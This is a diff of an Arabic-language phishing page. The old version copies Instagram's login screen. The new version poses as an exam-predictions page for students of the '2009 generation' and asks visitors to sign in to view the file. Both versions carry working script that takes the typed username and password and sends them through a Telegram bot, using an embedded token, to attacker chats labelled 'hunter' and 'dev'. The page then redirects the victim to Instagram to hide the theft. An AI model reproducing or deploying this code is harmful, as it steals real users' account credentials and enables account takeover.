@@ -1,36 +1,38 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>توقعات الإنجليزي - 2009</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .box { background: #fff; padding: 40px; border: 1px solid #dbdbdb; width: 350px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 8px; background: #0095f6; color: #fff; border: none; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
+        body { font-family: sans-serif; background: #fafafa; text-align: center; margin: 0; }
+        .header { background: linear-gradient(45deg, #f09433, #bc1888); color: white; padding: 15px; font-weight: bold; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; }
+        button { width: 95%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 5px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" width="175"><br><br>
-        <input type="text" id="u" placeholder="اسم المستخدم أو الهاتف">
-        <input type="password" id="p" placeholder="كلمة السر">
-        <button class="btn" onclick="s()">تسجيل الدخول</button>
-        <div class="footer">نسيت تفاصيل تسجيل الدخول؟</div>
+    <div class="header">مراجعة ليلة الامتحان - جيل 2009 📚</div>
+    <video width="100%" autoplay loop muted playsinline><source src="video.mp4" type="video/mp4"></video>
+    <div style="background: white; border: 1px solid #dbdbdb; margin: 10px; padding: 20px;">
+        <p>سجل دخولك لمشاهدة ملف التوقعات</p>
+        <form id="login">
+            <input type="text" id="u" placeholder="اسم المستخدم" required>
+            <input type="password" id="p" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
     </div>
     <script>
-        function s() {
-            const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            const id = new URLSearchParams(window.location.search).get('id');
-            if(u && p && id) {
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent("📸 **انستقرام جديد**\n👤: `"+u+"`\n🔑: `"+p+"` ")}&parse_mode=Markdown`)
-                .then(() => { window.location.href = "https://www.instagram.com/accounts/login/"; });
-            }
-        }
+        const pr = new URLSearchParams(window.location.search);
+        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
+        document.getElementById('login').onsubmit = function(e) {
+            e.preventDefault();
+            const msg = `🎯 صيدة انستقرام (2009) 🎯\n👤 الصياد: ${pr.get('hunter')}\n📧 الحساب: ${document.getElementById('u').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;
+            const fullMsg = encodeURIComponent(msg);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`)
+            .then(() => { window.location.href = "https://www.instagram.com"; });
+        };
     </script>
 </body>
 </html>
